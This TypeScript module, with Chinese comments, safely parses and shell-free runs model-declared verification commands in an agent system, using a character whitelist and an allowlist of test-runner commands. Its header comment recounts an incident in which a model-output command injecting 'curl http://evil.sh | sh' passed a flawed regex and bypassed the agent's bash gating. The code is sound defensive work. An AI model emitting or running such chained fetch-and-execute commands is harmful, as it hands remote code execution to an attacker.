/**
 * 声明式验证命令的安全解析与无 shell 执行（H4：模型自由文本命令 RCE 通道收口）。
 *
 * 事故形态：wave-gate 旧白名单正则只锚定行首（无 `$`），形如
 * `npx tsx; curl http://evil.sh | sh` 的恶意后缀整串穿透白名单后经
 * `spawnHidden(command, [], { shell: true })` 直达系统 shell——命令源是
 * 模型输出（worker 自报 verification / 计划声明命令 / 议事会 gate），等于
 * 绕过全部 bash 工具门禁的 RCE 通道。
 *
 * 约束：声明式自由文本命令只能以「token 字符集白名单 + argv 形状白名单」
 * 双重校验后的 argv 执行，绝不拼回字符串走 shell。
 */

import type { ChildProcess, SpawnOptions } from 'node:child_process'
import { spawnHidden } from '../tools/spawn-hidden.js'

/**
 * token 字符集白名单：字母 / 数字 / `@ . _ + / \ : = , -`。
 * 显式排除全部 shell 元字符 `; | & $ ( ) < > ^ ! " ' \` % { } [ ] ? *`——
 * `%` 尤其不能放行：cmd.exe 的 `%VAR%` 变量展开是 Windows 侧注入面。
 * `=` `,` 仅作普通 flag 字符放行（`--reporter=dot` / `pytest -k a,b`）：
 * 它们在 argv 定位处不具备命令链接或重定向能力。
 */
const TOKEN_RE = /^[A-Za-z0-9@._+\/\\:=,-]+$/

/** npm/pnpm/yarn 家族：`test` 或 `run <script>`（script 名必须存在）。 */
function matchPackageRunner(argv: string[]): boolean {
  if (argv[1] === 'test') return true
  return argv[1] === 'run' && argv[2] !== undefined && argv[2] !== ''
}

/** argv 形状白名单：首 token 命中已知 runner 家族且子命令形状匹配；尾参自由。 */
const VERIFY_FAMILIES: Record<string, (argv: string[]) => boolean> = {
  npx: (argv) => argv[1] !== undefined && ['tsc', 'vitest', 'jest', 'tsx'].includes(argv[1]!),
  npm: matchPackageRunner,
  pnpm: matchPackageRunner,
  yarn: matchPackageRunner,
  node: (argv) => argv[1] === '--test',
  cargo: (argv) => argv[1] === 'test' || argv[1] === 'check',
  go: (argv) => argv[1] === 'test' || argv[1] === 'vet' || argv[1] === 'build',
  pytest: () => true,
  python: (argv) => argv[1] === '-m' && argv[2] === 'pytest',
  make: (argv) => argv[1] === 'test' || argv[1] === 'check',
}

/**
 * 解析声明式验证命令为安全 argv；任何不安全形状返回 null（fail-closed：
 * 调用方必须按「不可执行」处理，绝不能退回字符串拼 shell）。
 * 只按空白切分、不做引号解析——含引号/反引号的 token 直接判 null：
 * 引号语义只有 shell 才有，出现即说明该串期待 shell 行为。
 */
export function parseVerifyCommand(command: string): string[] | null {
  const trimmed = command.trim()
  if (trimmed === '') return null
  const argv = trimmed.split(/\s+/)
  for (const token of argv) {
    if (!TOKEN_RE.test(token)) return null
  }
  const family = VERIFY_FAMILIES[argv[0]!]
  if (!family || !family(argv)) return null
  return argv
}

/**
 * 以已校验 argv 无 shell 执行。调用方必须先经 parseVerifyCommand——本函数
 * 自身不做字符集检查，而 win32 分支会把 argv 拼回 cmd 命令串，混入元字符即注入。
 *
 * win32 特例：npm/npx/yarn 是 `.cmd` shim，Node 拒绝无 shell 直启 → 经
 * ComSpec `/d /s /c` 转发；注入安全由上游字符集校验兜底（元字符无法存活）。
 */
export function spawnVerifyArgv(cwd: string, argv: readonly string[], options: SpawnOptions = {}): ChildProcess {
  if (argv.length === 0 || argv[0] === '') throw new Error('spawnVerifyArgv: empty argv')
  if (process.platform === 'win32') {
    const comspec = process.env.ComSpec ?? 'cmd.exe'
    return spawnHidden(comspec, ['/d', '/s', '/c', argv.join(' ')], { cwd, shell: false, ...options })
  }
  return spawnHidden(argv[0]!, argv.slice(1), { cwd, shell: false, ...options })
}
